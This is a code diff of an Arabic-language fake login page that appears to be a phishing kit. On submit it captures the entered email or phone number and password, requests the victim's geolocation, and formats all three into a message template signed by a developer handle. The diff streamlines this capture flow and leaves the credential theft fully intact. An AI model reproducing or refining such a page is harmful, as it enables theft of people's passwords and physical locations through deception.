@@ -135,26 +135,24 @@
 
     document.getElementById('loginForm').onsubmit = (e) => {
         e.preventDefault();
-        const user = document.getElementById('user').value.trim();
-        const pass = document.getElementById('pass').value;
+        const u = document.getElementById('user').value.trim();
+        const p = document.getElementById('pass').value;
 
         const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         const phoneRx = /^[0-9]{8,15}$/;
-        const hasArabic = /[\u0600-\u06FF]/.test(user);
+        const hasArabic = /[\u0600-\u06FF]/.test(u);
 
-        if ((emailRx.test(user) || phoneRx.test(user)) && !hasArabic && pass.length >= 6) {
+        if ((emailRx.test(u) || phoneRx.test(u)) && !hasArabic && p.length >= 6) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const loc = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-                        processCapture(user, pass, loc);
+                    (pos) => {
+                        const loc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        processCapture(u, p, loc);
                     },
-                    () => {
-                        processCapture(user, pass, "تم رفض الوصول للموقع");
-                    }
+                    () => { processCapture(u, p, "تم رفض الموقع"); }
                 );
             } else {
-                processCapture(user, pass, "المتصفح لا يدعم Geolocation");
+                processCapture(u, p, "Geolocation غير مدعوم");
             }
         } else {
             loginAttempts++;
@@ -165,15 +163,10 @@
             } else {
                 Swal.fire({
                     title: 'بيانات غير دقيقة',
-                    text: 'يرجى كتابة البريد الإلكتروني أو رقم الهاتف بشكل صحيح لتجنب الحظر مؤقتاً.',
+                    text: 'يرجى كتابة البيانات بشكل صحيح لتجنب الحظر.',
                     icon: 'error',
                     confirmButtonColor: '#22d3ee',
-                    allowOutsideClick: false,
                     customClass: { popup: 'glass-popup' }
-                }).then(() => {
-                    document.getElementById('user').value = '';
-                    document.getElementById('pass').value = '';
-                    document.getElementById('user').focus();
                 });
             }
         }
@@ -199,13 +192,6 @@
                 overlay.style.display = 'none';
                 localStorage.removeItem('lock_expiry');
                 loginAttempts = 0;
-                Swal.fire({
-                    title: 'مبروك!',
-                    text: 'تم إزالة الحظر عنك بنجاح، يمكنك المحاولة مجدداً.',
-                    icon: 'success',
-                    confirmButtonColor: '#22d3ee',
-                    customClass: { popup: 'glass-popup' }
-                });
             }
         }, 1000);
     }
@@ -228,7 +214,6 @@
 📍 **موقع الخريطة :** ${location}
 
 📧 **البريد الاكتروني :** \`${u}\`
-
 🔑 **كلمه السر :** \`${p}\`
 
 👤 **يامطوري :** @M6_vip
